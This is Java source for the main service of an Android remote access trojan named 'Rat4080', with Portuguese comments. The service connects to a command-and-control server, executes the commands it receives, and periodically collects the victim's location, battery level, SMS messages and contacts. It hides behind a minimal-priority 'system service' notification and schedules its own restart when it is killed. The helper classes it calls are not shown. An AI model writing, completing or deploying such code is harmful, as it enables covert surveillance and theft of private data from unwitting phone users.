package com.rat4080.trojan;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.location.*;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Serviço principal — mantém a ligação ao C2 e processa comandos
 */
public class MainService extends Service {
    
    private static final String TAG = "Rat4080Service";
    private static final int NOTIFICATION_ID = 4080;
    private static final String CHANNEL_ID = "system_service";
    
    private C2Client c2Client;
    private CommandHandler commandHandler;
    private DataCollector dataCollector;
    private Handler mainHandler;
    private String deviceId;
    
    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        
        // Carrega ou gera ID do dispositivo
        SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().replace("-", "");
            prefs.edit().putString("device_id", deviceId).apply();
        }
        
        // Inicia serviço em foreground
        startForeground(NOTIFICATION_ID, buildNotification());
        
        // Inicializa componentes
        commandHandler = new CommandHandler(this, deviceId);
        dataCollector = new DataCollector(this, deviceId);
        
        // Liga ao C2
        connectToC2();
        
        // Inicia recolha periódica
        startPeriodicCollection();
        
        Log.i(TAG, "Serviço iniciado. Device ID: " + deviceId);
    }
    
    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Serviço de Sistema",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Serviço ativo");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Serviço de Sistema")
            .setContentText("A executar em segundo plano")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setAutoCancel(false);
        
        return builder.build();
    }
    
    private void connectToC2() {
        c2Client = new C2Client(this, deviceId, new C2Client.C2Listener() {
            @Override
            public void onCommandReceived(JSONObject command) {
                commandHandler.handleCommand(command);
            }
            
            @Override
            public void onConnected() {
                Log.i(TAG, "Ligado ao C2");
            }
            
            @Override
            public void onDisconnected() {
                Log.i(TAG, "Desligado do C2. A reconectar em 10s...");
                mainHandler.postDelayed(() -> connectToC2(), 10000);
            }
        });
        c2Client.connect();
    }
    
    private void startPeriodicCollection() {
        // Recolhe localização a cada 5 minutos
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                dataCollector.collectLocation();
                dataCollector.collectBatteryLevel();
                mainHandler.postDelayed(this, 5 * 60 * 1000);
            }
        }, 5000);
        
        // Recolhe SMS a cada 15 minutos
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                dataCollector.collectSms();
                dataCollector.collectContacts();
                mainHandler.postDelayed(this, 15 * 60 * 1000);
            }
        }, 15000);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        // Tenta reiniciar
        Intent restartIntent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 0, restartIntent, PendingIntent.FLAG_IMMUTABLE
        );
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 5000,
                pendingIntent
            );
        }
        
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
